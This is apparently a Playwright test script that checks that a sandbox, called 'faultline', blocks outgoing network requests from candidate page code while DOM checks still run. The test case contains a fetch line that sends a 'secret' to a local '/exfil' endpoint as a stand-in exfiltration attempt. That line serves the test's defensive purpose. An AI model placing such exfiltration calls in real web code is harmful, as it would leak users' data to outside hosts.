import { chromium } from 'playwright';
import { spawn } from 'node:child_process';
import http from 'node:http';
import assert from 'node:assert/strict';

const appPort=4215;
const sinkPort=4216;
let sinkHits=0;
const sink=http.createServer((req,res)=>{sinkHits++;res.writeHead(204,{'access-control-allow-origin':'*'});res.end();});
await new Promise((resolve,reject)=>sink.once('error',reject).listen(sinkPort,'127.0.0.1',resolve));

const server=spawn(process.execPath,['-e',`const http=require('http'),fs=require('fs'),path=require('path');http.createServer((req,res)=>{let p=req.url.split('?')[0];if(p==='/')p='/index.html';const f=path.join(process.cwd(),p);if(!f.startsWith(process.cwd())){res.statusCode=403;return res.end()}fs.readFile(f,(e,b)=>{if(e){res.statusCode=404;return res.end('not found')}if(f.endsWith('.js'))res.setHeader('content-type','application/javascript');if(f.endsWith('.html'))res.setHeader('content-type','text/html; charset=utf-8');res.end(b)})}).listen(${appPort},'127.0.0.1')`],{stdio:'inherit'});
await new Promise(r=>setTimeout(r,700));

let browser;
try{
  browser=await chromium.launch({headless:true});
  const page=await browser.newPage();
  await page.goto(`http://127.0.0.1:${appPort}/`,{waitUntil:'networkidle'});
  await page.waitForFunction(()=>window.faultline);

  let state=await page.evaluate(()=>window.faultline.inspect());
  state=await page.evaluate(({revision,sinkPort})=>window.faultline.loadCase({
    expectedRevision:revision,
    case:{
      html:'<main id="payload">contained</main>',
      css:'',
      js:`fetch('http://127.0.0.1:${sinkPort}/exfil?secret=faultline').catch(()=>{});`,
      oracle:{kind:'dom_exists',selector:'#payload',equals:true,action:{kind:'none'},delayMs:120}
    }
  }),{revision:state.revision,sinkPort});

  const result=await page.evaluate(({revision})=>window.faultline.run({expectedRevision:revision}),{revision:state.revision});
  assert.equal(result.status,'FAIL','benign DOM oracle should still execute under a network-deny sandbox');
  await page.waitForTimeout(250);
  assert.equal(sinkHits,0,'candidate fetch must never leave the isolated experiment sandbox');

  console.log('Sandbox network egress PASS: candidate fetch attempts are blocked while deterministic DOM execution still completes.');
} finally {
  if(browser)await browser.close();
  server.kill('SIGTERM');
  await new Promise(resolve=>sink.close(resolve));
}
